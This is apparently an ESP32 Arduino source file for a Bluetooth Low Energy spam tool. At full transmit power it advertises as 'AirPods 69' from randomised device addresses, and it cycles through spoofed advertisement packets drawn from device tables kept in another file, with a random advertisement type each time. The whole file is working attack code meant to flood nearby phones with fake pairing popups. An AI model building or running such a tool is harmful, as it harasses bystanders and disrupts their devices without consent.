#include "ble.hpp"
#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_arduino_version.h>
#include "devices.hpp"

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

BLEAdvertising *pAdvertising = nullptr;
uint32_t delayMilliseconds = 1000;

void bleSetup() {
  Serial.println(F("Starting ESP32 BLE"));

  pinMode(12, OUTPUT);
  pinMode(13, OUTPUT);

  BLEDevice::init("AirPods 69");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void bleLoop() {
  digitalWrite(12, HIGH);
  digitalWrite(13, HIGH);

  esp_bd_addr_t dummy_addr = {0};
  for (int i = 0; i < 6; i++) {
    dummy_addr[i] = random(256);
    if (i == 0) {
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData;

  int device_choice = random(2);
  if (device_choice == 0) {
    int index = random(17);
    uint8_t buffer[31];
    memcpy_P(buffer, DEVICES[index], 31);
    oAdvertisementData.addData(std::string((char *)buffer, 31));
  } else {
    int index = random(13);
    uint8_t buffer[23];
    memcpy_P(buffer, SHORT_DEVICES[index], 23);
    oAdvertisementData.addData(std::string((char *)buffer, 23));
  }

  int adv_type_choice = random(3);
  if (adv_type_choice == 0) {
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1) {
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);

  Serial.println(F("Sending Advertisement..."));
  pAdvertising->start();

  digitalWrite(12, LOW);
  digitalWrite(13, LOW);
  delay(delayMilliseconds);
  pAdvertising->stop();
}
